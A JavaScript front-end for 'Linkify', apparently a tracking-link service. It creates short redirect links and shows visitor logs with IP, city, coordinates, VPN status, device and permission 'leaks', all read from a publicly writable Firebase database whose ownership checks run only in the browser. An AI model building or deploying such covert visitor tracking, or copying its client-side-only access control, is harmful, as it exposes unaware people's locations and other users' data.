// Linkify Rebuild (PUBLIC RTDB RULES VERSION)
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-app.js";
import { getDatabase, ref, get, set, update, remove, onValue, off, runTransaction, push } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-database.js";

// ---------- Particles (unchanged) ----------
function startPurpleParticles(canvasId="bg"){
  const canvas = document.getElementById(canvasId);
  if(!canvas) return;
  const ctx = canvas.getContext("2d");
  let w=0,h=0,dpr=1;

  const cfg = { maxParticles: 110, connectDist: 140, speed: 0.35, jitter: 0.14, dotR: 2.0 };
  const particles = [];

  function resize(){
    dpr = Math.max(1, Math.min(2, window.devicePixelRatio||1));
    w = canvas.width = Math.floor(window.innerWidth*dpr);
    h = canvas.height = Math.floor(window.innerHeight*dpr);
    canvas.style.width = window.innerWidth+"px";
    canvas.style.height = window.innerHeight+"px";
    const target = Math.round(Math.min(cfg.maxParticles, (window.innerWidth*window.innerHeight)/16000));
    while(particles.length < target) spawn();
    while(particles.length > target) particles.pop();
  }
  function rand(a,b){ return a + Math.random()*(b-a); }
  function spawn(){
    const ang = rand(0, Math.PI*2);
    particles.push({ x: rand(0,w), y: rand(0,h), vx: Math.cos(ang)*cfg.speed*dpr, vy: Math.sin(ang)*cfg.speed*dpr });
  }
  window.addEventListener("resize", resize);
  resize();

  function step(){
    ctx.clearRect(0,0,w,h);

    for(const p of particles){
      p.vx += (Math.random()-0.5)*cfg.jitter*0.02*dpr;
      p.vy += (Math.random()-0.5)*cfg.jitter*0.02*dpr;
      p.x += p.vx; p.y += p.vy;

      if(p.x < -10*dpr) p.x = w + 10*dpr;
      if(p.x > w + 10*dpr) p.x = -10*dpr;
      if(p.y < -10*dpr) p.y = h + 10*dpr;
      if(p.y > h + 10*dpr) p.y = -10*dpr;

      ctx.beginPath();
      ctx.fillStyle = "rgba(167,139,250,0.85)";
      ctx.arc(p.x,p.y,cfg.dotR*dpr,0,Math.PI*2);
      ctx.fill();

      ctx.beginPath();
      ctx.fillStyle = "rgba(124,58,237,0.14)";
      ctx.arc(p.x,p.y,(cfg.dotR*3.2)*dpr,0,Math.PI*2);
      ctx.fill();
    }

    const maxD = cfg.connectDist*dpr;
    for(let i=0;i<particles.length;i++){
      for(let j=i+1;j<particles.length;j++){
        const a = particles[i], b = particles[j];
        const dx = a.x-b.x, dy = a.y-b.y;
        const dist = Math.hypot(dx,dy);
        if(dist < maxD){
          const t = 1 - (dist/maxD);
          ctx.strokeStyle = `rgba(124,58,237,${0.10 + t*0.35})`;
          ctx.lineWidth = (0.8 + t*0.6)*dpr;
          ctx.beginPath();
          ctx.moveTo(a.x,a.y);
          ctx.lineTo(b.x,b.y);
          ctx.stroke();
        }
      }
    }

    requestAnimationFrame(step);
  }
  requestAnimationFrame(step);
}

// ---------- Utilities ----------
function escapeHtml(s){
  return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}
function toast(msg){
  const t = document.createElement("div");
  t.textContent = msg;
  t.style.position="fixed";
  t.style.left="50%";
  t.style.bottom="20px";
  t.style.transform="translateX(-50%)";
  t.style.padding="10px 12px";
  t.style.borderRadius="14px";
  t.style.background="rgba(0,0,0,.6)";
  t.style.border="1px solid rgba(167,139,250,.22)";
  t.style.backdropFilter="blur(10px)";
  t.style.zIndex="9999";
  document.body.appendChild(t);
  setTimeout(()=>t.remove(), 1400);
}
function sleep(ms){ return new Promise(r=>setTimeout(r, ms)); }
function clamp(n,a,b){ return Math.max(a, Math.min(b,n)); }
function now(){ return Date.now(); }
function dayKey(ts){
  const d = new Date(ts);
  const yyyy = d.getUTCFullYear();
  const mm = String(d.getUTCMonth()+1).padStart(2,"0");
  const dd = String(d.getUTCDate()).padStart(2,"0");
  return `${yyyy}-${mm}-${dd}`;
}
async function sha1hex(str){
  const buf = new TextEncoder().encode(str);
  const hash = await crypto.subtle.digest("SHA-1", buf);
  return [...new Uint8Array(hash)].map(b=>b.toString(16).padStart(2,"0")).join("");
}
function appOrigin(){ return window.location.origin || (new URL(window.location.href)).origin; }
function redirectUrl(code){ return `${appOrigin()}/r/?c=${encodeURIComponent(code)}`; }

// ---------- Firebase Config ----------
const firebaseConfig = {
  apiKey: "AIzaSyCBXEojqfTH7GduwQKJsTE_NkU5IML7ATQ",
  authDomain: "whitte.firebaseapp.com",
  databaseURL: "https://whitte-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "whitte",
  storageBucket: "whitte.firebasestorage.app",
  messagingSenderId: "484651897220",
  appId: "1:484651897220:web:18e3ab9a3f1ff45c9d4dd1",
  measurementId: "G-F6904TN7CV"
};

const ROOT = "linkify";
const MAX_LINKS_PER_CLIENT = 5;
const CODE_LEN = 5;
const CODE_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
const $ = (id)=>document.getElementById(id);

const state = { clientId:null, selectedCode:null, statsUnsub:null, logsUnsub:null };

function getOrMakeClientId(){
  const k = "linkify_client_id";
  let v = localStorage.getItem(k);
  if(!v){ v = "c_" + crypto.getRandomValues(new Uint32Array(4)).join("-").replace(/-/g,'').slice(0,10); localStorage.setItem(k,v); }
  if (!v.startsWith('c_')) v = 'c_' + v.slice(0,10);
  else if (v.length > 12) v = v.slice(0,12);
  return v;
}

function show(viewId){
  ["homeView","dashView"].forEach(v=>$(v).classList.add("hidden"));
  $(viewId).classList.remove("hidden");
  $("btnHome").classList.toggle("hidden", viewId==="homeView");
}

function setTab(tab){
  document.querySelectorAll(".tab").forEach(t=>t.classList.remove("active"));
  document.querySelectorAll(".tabBody").forEach(b=>b.classList.add("hidden"));
  document.querySelector(`.tab[data-tab="${tab}"]`).classList.add("active");
  $(`tab_${tab}`).classList.remove("hidden");
}

function linkRef(code){ return ref(db, `${ROOT}/links/${code}`); }
function statsRef(code){ return ref(db, `${ROOT}/stats/${code}`); }
function logsRef(code){ return ref(db, `${ROOT}/logs/${code}`); }
function dailyRef(code, day){ return ref(db, `${ROOT}/daily/${code}/${day}`); }
function uniqueRef(code, clientKey){ return ref(db, `${ROOT}/unique/${code}/${clientKey}`); }

function defaults(){
  return {
    profileOn:false, iconUrl:"", name:"", desc:"", primary:"#7c3aed", secondary:"#a78bfa", boxBg:"",
    preloadOn:false, preloadSec:0, autoRedirect:true, captchaOn:false,
    instantRedirect: false,
    expirationOn:false, expiresAt:0, showExpiration:false,
    limitOn:false, limitCount:0, noRepeat:false, showLimit:false,
    hooksOn:false, webhooks:["","",""],
  };
}

function sanitizeUrl(u){
  try{ const url = new URL(u); if(url.protocol!=="https:" && url.protocol!=="http:") return null; return url.toString(); }
  catch{ return null; }
}

function randomCode(){
  const arr = new Uint8Array(CODE_LEN);
  crypto.getRandomValues(arr);
  return [...arr].map(n=>CODE_ALPHABET[n % CODE_ALPHABET.length]).join("");
}

async function generateUniqueCode(){
  for(let i=0;i<30;i++){
    const code = randomCode();
    const snap = await get(linkRef(code));
    if(!snap.exists()) return code;
  }
  throw new Error("Too many collisions generating code.");
}

async function listMyLinks(){
  const snap = await get(ref(db, `${ROOT}/links`));
  const all = snap.exists()?snap.val():{};
  return Object.entries(all).filter(([,v])=>v && v.ownerClientId===state.clientId)
    .map(([code,v])=>({code,...v})).sort((a,b)=>(b.createdAt||0)-(a.createdAt||0));
}

function renderLinksList(items){
  const wrap = $("linksList"); wrap.innerHTML="";
  if(items.length===0){
    const d=document.createElement("div"); d.className="item";
    d.innerHTML=`<div class="meta"><div class="t">No links yet</div><div class="s">Click “Create link”.</div></div>`;
    wrap.appendChild(d); return;
  }
  for(const it of items){
    const el=document.createElement("div"); el.className="item";
    const title=(it.settings?.name||it.code);
    const sub=`${it.code} • ${it.enabled?"active":"off"} • ${it.url||""}`;
    el.innerHTML=`
      <div class="meta"><div class="t">${escapeHtml(title)}</div><div class="s">${escapeHtml(sub)}</div></div>
      <div class="actions"><button class="btn" data-open="${it.code}">Open</button><button class="btn ghost" data-copy="${it.code}">Copy</button></div>`;
    wrap.appendChild(el);
  }
  wrap.querySelectorAll("[data-open]").forEach(b=>b.addEventListener("click",()=>openDashboard(b.getAttribute("data-open"))));
  wrap.querySelectorAll("[data-copy]").forEach(b=>b.addEventListener("click",async ()=>{
    const code=b.getAttribute("data-copy");
    await navigator.clipboard.writeText(redirectUrl(code));
    toast("Copied redirect link");
  }));
}

async function refreshHome(){ renderLinksList(await listMyLinks()); }

function openCreateModal(){
  $("modalErr").classList.add("hidden"); $("modalErr").textContent="";
  $("newUrl").value=""; $("genResult").classList.add("hidden");
  $("createModal").classList.remove("hidden"); $("modalBackdrop").classList.remove("hidden");
}
function closeCreateModal(){ $("createModal").classList.add("hidden"); $("modalBackdrop").classList.add("hidden"); }
function showModalErr(msg){ $("modalErr").textContent=msg; $("modalErr").classList.remove("hidden"); }

let pendingCreate=null;
async function doGenerate(){
  const url=sanitizeUrl($("newUrl").value.trim());
  if(!url) return showModalErr("Enter a valid http(s) URL.");
  const mine=await listMyLinks();
  if(mine.length>=MAX_LINKS_PER_CLIENT) return showModalErr(`Per-user limit reached: max ${MAX_LINKS_PER_CLIENT} links.`);
  const code=await generateUniqueCode();
  await set(linkRef(code), { ownerClientId:state.clientId, url, enabled:false, createdAt:now(), updatedAt:now(), settings:defaults() });
  await set(statsRef(code), { entries:0, redirects:0 });
  pendingCreate={code,url};
  const r=redirectUrl(code); $("genLink").textContent=r; $("genLink").href=r; $("genResult").classList.remove("hidden");
}
async function doStartLink(){
  if(!pendingCreate) return;
  await update(linkRef(pendingCreate.code), { enabled:true, updatedAt:now() });
  pendingCreate=null; closeCreateModal(); await refreshHome(); await openDashboard(null,true);
}
async function doAbortLink(){
  if(!pendingCreate){ closeCreateModal(); return; }
  await remove(linkRef(pendingCreate.code)); await remove(statsRef(pendingCreate.code));
  pendingCreate=null; closeCreateModal(); await refreshHome();
}

function unbindDashboard(){
  if(state.statsUnsub){ off(statsRef(state.selectedCode),"value",state.statsUnsub); state.statsUnsub=null; }
  if(state.logsUnsub){ off(logsRef(state.selectedCode),"value",state.logsUnsub); state.logsUnsub=null; }
}
function updateStatusPill(enabled){
  $("statusPill").classList.remove("ok","off");
  if(enabled){ $("statusPill").textContent="ACTIVE"; $("statusPill").classList.add("ok"); }
  else { $("statusPill").textContent="OFF"; $("statusPill").classList.add("off"); }
}
let expirationInterval = null;

function updateTimeLeftUI(link) {
  const s = link.settings || {};
  const el = $("statTimeLeft");

  if (!s.expirationOn) {
    el.textContent = "—";
    return;
  }

  if (expirationInterval) clearInterval(expirationInterval);

  function tick() {
    const left = (s.expiresAt || 0) - now();
    if (left <= 0) {
      el.textContent = "expired";
      clearInterval(expirationInterval);
      return;
    }
    const sec = Math.floor(left / 1000);
    const h = Math.floor(sec / 3600);
    const m = Math.floor((sec % 3600) / 60);
    const ss = sec % 60;
    if (h > 0) el.textContent = `${h}h ${m}m ${ss}s`;
    else if (m > 0) el.textContent = `${m}m ${ss}s`;
    else el.textContent = `${ss}s`;
  }
  tick();
  expirationInterval = setInterval(tick, 1000);
}

function updateEnterLimitUI(link){
  const s=link.settings||{};
  if(!s.limitOn){ $("statEnterLimit").textContent="—"; return; }
  $("statEnterLimit").textContent = `${s.limitCount||0}${s.noRepeat?" (unique)":""}`;
}

function fillSettingsForm(link){
  const s={...defaults(), ...(link.settings||{})};
  $("setUrl").value=link.url||"";
  $("setEnabled").checked=!!link.enabled;

  $("setProfileOn").checked=!!s.profileOn;
  $("profileFields").classList.toggle("hidden", !s.profileOn);
  $("setIcon").value=s.iconUrl||"";
  $("setName").value=s.name||"";
  $("setDesc").value=s.desc||"";
  $("setPrimary").value=s.primary||"#7c3aed";
  $("setSecondary").value=s.secondary||"#a78bfa";
  $("setBoxBg").value=s.boxBg||"";

  $("setAutoRedirect").checked=!!s.autoRedirect;
  $("setInstantRedirect").checked = !!s.instantRedirect;

  // Handle mutual exclusivity between preload and instant redirect
  function updatePreloadState() {
    const instant = $("setInstantRedirect").checked;
    const profile = $("setProfileOn").checked;
    $("setPreloadOn").disabled = instant || profile;
    $("setPreloadSec").disabled = instant;
    if (instant) {
      $("setPreloadOn").checked = false;
      $("setPreloadSec").value = "0";
    } else if (profile) {
      $("setPreloadOn").checked = true;
    }
  }
  $("setInstantRedirect").addEventListener("change", updatePreloadState);
  $("setProfileOn").addEventListener("change", updatePreloadState);

  if (s.profileOn) {
    $("setPreloadOn").checked = true; $("setPreloadOn").disabled = true;
    $("setPreloadSec").value = String(Math.max(0.2, Number(s.preloadSec||0.2)));
    $("setPreloadSec").min = "0.2";
  } else {
    $("setPreloadOn").disabled = s.instantRedirect;
    $("setPreloadOn").checked = s.instantRedirect ? false : !!s.preloadOn;
    $("setPreloadSec").value = s.instantRedirect ? "0" : String(Number(s.preloadSec||0));
    $("setPreloadSec").min = "0.0";
  }
  $("setPreloadSec").disabled = s.instantRedirect;

  $("setCaptchaOn").checked=!!s.captchaOn;

  $("setExpOn").checked=!!s.expirationOn;
  $("expFields").classList.toggle("hidden", !s.expirationOn);
  $("setExpSec").value = s.expirationOn ? String(clamp(Math.max(30, Math.round((Number(s.expiresAt||0)-now())/1000)), 30, 259200)) : "3600";
  $("setShowExp").checked=!!s.showExpiration;

  $("setLimitOn").checked=!!s.limitOn;
  $("limitFields").classList.toggle("hidden", !s.limitOn);
  $("setLimitCount").value = s.limitCount ? String(s.limitCount) : "10";
  $("setNoRepeat").checked=!!s.noRepeat;
  $("setShowLimit").checked=!!s.showLimit;

  $("setHooksOn").checked=!!s.hooksOn;
  $("hooksFields").classList.toggle("hidden", !s.hooksOn);
  $("setHook1").value=(s.webhooks?.[0]||"");
  $("setHook2").value=(s.webhooks?.[1]||"");
  $("setHook3").value=(s.webhooks?.[2]||"");
}

// ---------- Log Detail Modal ----------
function openLogDetailModal(log) {
  const modal = $("logDetailModal");
  const content = $("logDetailContent");
  content.innerHTML = "";

  function addSection(title, fields) {
    const sec = document.createElement("div");
    sec.className = "detailSection";
    sec.innerHTML = `<div class="detailSectionTitle">${title}</div>`;
    fields.forEach(([label, value]) => {
      const row = document.createElement("div");
      row.className = "detailRow";
      row.innerHTML = `<div class="detailLabel">${label}</div><div class="detailValue copyable" data-copy="${escapeHtml(String(value))}">${escapeHtml(String(value))}</div>`;
      sec.appendChild(row);
    });
    content.appendChild(sec);
  }

  const ipFields = [
    ["IP", log.ip || "unknown"],
    ["Continent", log.continent || "unknown"],
    ["Country", log.country || "unknown"],
    ["City", log.city || "unknown"],
    ["Coordinates", log.coordinates || "unknown"],
    ["VPN", log.vpn || "unknown"]
  ];
  addSection("IP Address", ipFields);

  addSection("Client ID", [["Client ID", log.clientKey]]);

  const deviceFields = [
    ["Name", log.deviceName || "unknown"],
    ["Type", log.deviceType || "unknown"],
    ["Browser", log.browserType || "unknown"]
  ];
  addSection("Device", deviceFields);

  const permText = Array.isArray(log.permissions) ? log.permissions.join(", ") : "None";
  addSection("Permissions", [["Leaks", permText]]);

  const enteredStr = log.t ? new Date(log.t).toLocaleString() : "unknown";
  const exitedStr = log.exitedAt ? new Date(log.exitedAt).toLocaleString() : "unknown";
  addSection("Visit Info", [
    ["Enter #", log.enterNumber || "1"],
    ["Entered", enteredStr],
    ["Exited", exitedStr]
  ]);

  // Copy on click
  content.querySelectorAll(".copyable").forEach(el => {
    el.addEventListener("click", async () => {
      const text = el.getAttribute("data-copy");
      await navigator.clipboard.writeText(text);
      toast("Copied to clipboard");
    });
  });

  modal.classList.remove("hidden");
  $("modalBackdrop").classList.remove("hidden");
}

function closeLogDetailModal() {
  $("logDetailModal").classList.add("hidden");
  $("modalBackdrop").classList.add("hidden");
}

// ---------- Render Logs (updated) ----------
const MAX_LOGS = 200;
function renderLogs(rows, totalCount) {
  const wrap=$("logsList"); wrap.innerHTML="";
  if(rows.length===0){
    const d=document.createElement("div"); d.className="item";
    d.innerHTML=`<div class="meta"><div class="t">No logs</div><div class="s">No entries yet.</div></div>`;
    wrap.appendChild(d); return;
  }

  // Show warning if limit reached
  if (totalCount > MAX_LOGS) {
    const warn = document.createElement("div");
    warn.className = "logLimitWarning";
    warn.textContent = `⚠️ Logs filled up (${totalCount} total). Showing newest ${MAX_LOGS}. Oldest are automatically removed.`;
    wrap.appendChild(warn);
  }

  for(const r of rows){
    const clientDisplay = r.clientKey || "unknown";
    const timeStr = r.t ? new Date(r.t).toLocaleString() : "";
    const el=document.createElement("div"); el.className="item";
    el.innerHTML=`<div class="meta"><div class="t">${escapeHtml(clientDisplay)}</div><div class="s">${escapeHtml(timeStr)}</div></div>
      <div class="actions"><button class="btn ghost detail-log-btn">Details</button></div>`;
    el.querySelector(".detail-log-btn").addEventListener("click", (e) => {
      e.stopPropagation();
      openLogDetailModal(r);
    });
    wrap.appendChild(el);
  }
}

async function openDashboard(code=null, preferLatest=false){
  show("dashView"); setTab("overview");
  if(preferLatest && !code){ const mine=await listMyLinks(); if(mine[0]) code=mine[0].code; }
  if(!code){ const mine=await listMyLinks(); if(!mine[0]){ show("homeView"); return; } code=mine[0].code; }
  state.selectedCode=code;
  await bindDashboard(code);
}

async function bindDashboard(code){
  unbindDashboard();
  const linkSnap=await get(linkRef(code));
  if(!linkSnap.exists()){ toast("Link not found"); show("homeView"); return; }
  const link=linkSnap.val();
  if(link.ownerClientId!==state.clientId){ toast("Not your link (this device)."); show("homeView"); return; }

  $("dashTitle").textContent = link.settings?.name ? `Dashboard • ${link.settings.name}` : `Dashboard • ${code}`;
  $("origLink").textContent=link.url; $("origLink").href=link.url;
  const r=redirectUrl(code); $("redirLink").textContent=r; $("redirLink").href=r;
  updateStatusPill(!!link.enabled);
  fillSettingsForm(link);
  updateTimeLeftUI(link);
  updateEnterLimitUI(link);

  const statsCb = (snap) => {
    const v = snap.exists() ? snap.val() : { entries: 0, redirects: 0 };
    const totalEntries = Number(v.entries || 0);
    const totalRedirects = Number(v.redirects || 0);
    $("statEntries").textContent = String(totalEntries);
    $("statRedirects").textContent = String(totalRedirects);
    const s = link.settings || {};
    if (s.limitOn) {
      const baseline = Number(s.limitStartEntries || 0);
      const max = Number(s.limitCount || 0);
      const currentSinceLimit = Math.max(0, totalEntries - baseline);
      $("statEnterLimit").textContent = `${currentSinceLimit}/${max}`;
    }
  };
  state.statsUnsub=statsCb; onValue(statsRef(code), statsCb);

  const logsCb = (snap) => {
    const v = snap.exists() ? snap.val() : {};
    const entries = Object.entries(v).map(([id,val]) => ({id,...val}));
    const total = entries.length;
    const sorted = entries.sort((a,b)=>(b.t||0)-(a.t||0));
    const limited = sorted.slice(0, MAX_LOGS);
    renderLogs(limited, total);
  };
  state.logsUnsub=logsCb; onValue(logsRef(code), logsCb);
}

// ---------- Save Settings (with color fix) ----------
async function saveSettings() {
  const code = state.selectedCode;
  if (!code) return;

  const linkSnap = await get(linkRef(code));
  if (!linkSnap.exists()) return;
  const link = linkSnap.val();
  if (link.ownerClientId !== state.clientId) { toast("Not your link"); return; }

  const newUrl = sanitizeUrl($("setUrl").value.trim());
  if (!newUrl) { toast("Invalid URL"); return; }

  const enabled = $("setEnabled").checked;
  const prevSettings = link.settings || {};
  const s = { ...defaults(), ...prevSettings };

  // Profile
  s.profileOn = $("setProfileOn").checked;
  if (s.profileOn) {
    s.iconUrl = $("setIcon").value.trim();
    s.name = $("setName").value.trim();
    s.desc = $("setDesc").value.trim();
    s.primary = $("setPrimary").value.trim() || "#7c3aed";
    s.secondary = $("setSecondary").value.trim() || "#a78bfa";
    s.boxBg = $("setBoxBg").value.trim();
    s.preloadOn = true;
    s.preloadSec = Math.max(0.2, Number($("setPreloadSec").value || 0.2));
  } else {
    s.iconUrl = s.name = s.desc = s.boxBg = "";
    s.preloadOn = $("setPreloadOn").checked;
    s.preloadSec = s.preloadOn ? Math.max(0, Number($("setPreloadSec").value || 0)) : 0;
  }

  s.autoRedirect = $("setAutoRedirect").checked;
  s.instantRedirect = $("setInstantRedirect").checked;
  if (s.instantRedirect) {
    s.preloadOn = false;
    s.preloadSec = 0;
  }

  s.captchaOn = $("setCaptchaOn").checked;

  // Expiration
  s.expirationOn = $("setExpOn").checked;
  if (s.expirationOn) {
    let sec = Number($("setExpSec").value || 600);
    sec = clamp(Math.round(sec), 30, 259200);
    s.expiresAt = now() + sec * 1000;
    s.showExpiration = $("setShowExp").checked;
  } else {
    s.expiresAt = 0; s.showExpiration = false;
  }

  // Limit
  s.limitOn = $("setLimitOn").checked;
  const wasLimitOn = !!prevSettings.limitOn;
  if (s.limitOn) {
    s.limitCount = clamp(Math.round(Number($("setLimitCount").value || 0)), 1, 1000000);
    s.noRepeat = $("setNoRepeat").checked;
    s.showLimit = $("setShowLimit").checked;
    const stSnap = await get(statsRef(code));
    const totalEntries = stSnap.exists() ? Number(stSnap.val().entries || 0) : 0;
    const prevBaseline = Number(prevSettings.limitStartEntries || 0);
    if (!wasLimitOn) s.limitStartEntries = totalEntries;
    else if (prevBaseline === 0 && totalEntries > 0) s.limitStartEntries = totalEntries;
    else s.limitStartEntries = prevBaseline;
  } else {
    s.limitCount = 0; s.noRepeat = false; s.showLimit = false; s.limitStartEntries = 0;
  }

  // Webhooks
  s.hooksOn = $("setHooksOn")?.checked || false;
  if (s.hooksOn) {
    s.webhooks = [
      $("setHook1")?.value.trim() || "",
      $("setHook2")?.value.trim() || "",
      $("setHook3")?.value.trim() || ""
    ];
  } else {
    s.webhooks = ["", "", ""];
  }

  await set(linkRef(code), { ...link, url: newUrl, enabled, settings: s });
  toast("Settings saved");
  await bindDashboard(code); // refresh UI
}

async function saveUrlOnly(){
  const code=state.selectedCode; if(!code) return;
  const newUrl=sanitizeUrl($("setUrl").value.trim()); if(!newUrl){ toast("Invalid URL"); return; }
  if(!confirm("Change original URL?")) return;
  await update(linkRef(code), { url:newUrl, updatedAt:now() });
  toast("URL updated");
  await bindDashboard(code);
}

async function deleteCurrentLink(){
  const code=state.selectedCode; if(!code) return;
  if(!confirm("Delete this link? This also deletes stats, logs, daily and unique.")) return;
  await remove(linkRef(code)); await remove(statsRef(code));
  await remove(ref(db, `${ROOT}/daily/${code}`));
  await remove(ref(db, `${ROOT}/logs/${code}`));
  await remove(ref(db, `${ROOT}/unique/${code}`));
  toast("Deleted"); state.selectedCode=null; await refreshHome(); show("homeView");
}

async function clearLogs(){
  const code=state.selectedCode; if(!code) return;
  if(!confirm("Clear all logs?")) return;
  await remove(ref(db, `${ROOT}/logs/${code}`));
  toast("Logs cleared");
}

function wireUI(){
  $("btnCreate").addEventListener("click", openCreateModal);
  $("btnCloseModal").addEventListener("click", closeCreateModal);
  $("btnCancelCreate").addEventListener("click", closeCreateModal);
  $("modalBackdrop").addEventListener("click", closeCreateModal);
  $("closeLogDetailModal").addEventListener("click", closeLogDetailModal);

  $("btnGenerate").addEventListener("click", doGenerate);
  $("btnStartLink").addEventListener("click", doStartLink);
  $("btnAbortLink").addEventListener("click", doAbortLink);

  $("btnOpenDashboard").addEventListener("click", ()=>openDashboard());
  $("btnHome").addEventListener("click", async ()=>{ await refreshHome(); show("homeView"); });

  document.querySelectorAll(".tab").forEach(t=>t.addEventListener("click", ()=>setTab(t.getAttribute("data-tab"))));

  $("btnCopyRedirect").addEventListener("click", async ()=>{ if(!state.selectedCode) return;
    await navigator.clipboard.writeText(redirectUrl(state.selectedCode)); toast("Copied");
  });
  $("btnOpenRedirect").addEventListener("click", ()=>{ if(!state.selectedCode) return; window.open(redirectUrl(state.selectedCode), "_blank"); });
  $("btnDeleteLink").addEventListener("click", deleteCurrentLink);
  $("btnClearLogs").addEventListener("click", clearLogs);

  $("btnSaveSettings").addEventListener("click", saveSettings);
  $("btnSaveUrl").addEventListener("click", saveUrlOnly);

  $("setProfileOn").addEventListener("change", ()=>{
    $("profileFields").classList.toggle("hidden", !$("setProfileOn").checked);
    if($("setProfileOn").checked){
      $("setPreloadOn").checked=true; $("setPreloadOn").disabled=true;
      $("setPreloadSec").value=String(Math.max(0.2, Number($("setPreloadSec").value||0.2))); $("setPreloadSec").min="0.2";
    }else{
      const instant = $("setInstantRedirect").checked;
      $("setPreloadOn").disabled = instant;
      $("setPreloadSec").min="0.0";
    }
  });

  $("setExpOn").addEventListener("change", ()=> $("expFields").classList.toggle("hidden", !$("setExpOn").checked));
  $("setLimitOn").addEventListener("change", ()=> $("limitFields").classList.toggle("hidden", !$("setLimitOn").checked));
  $("setHooksOn").addEventListener("change", ()=> $("hooksFields").classList.toggle("hidden", !$("setHooksOn").checked));

  // Instant redirect toggle mutual exclusion
  $("setInstantRedirect").addEventListener("change", () => {
    const instant = $("setInstantRedirect").checked;
    $("setPreloadOn").disabled = instant || $("setProfileOn").checked;
    $("setPreloadSec").disabled = instant;
    if (instant) {
      $("setPreloadOn").checked = false;
      $("setPreloadSec").value = "0";
    }
  });
}

async function boot(){
  state.clientId=getOrMakeClientId();
  startPurpleParticles("bg");
  wireUI();
  show("homeView");
  await refreshHome();
}

boot().catch(e=>{ console.error(e); alert("Startup error: "+(e?.message||e)); });
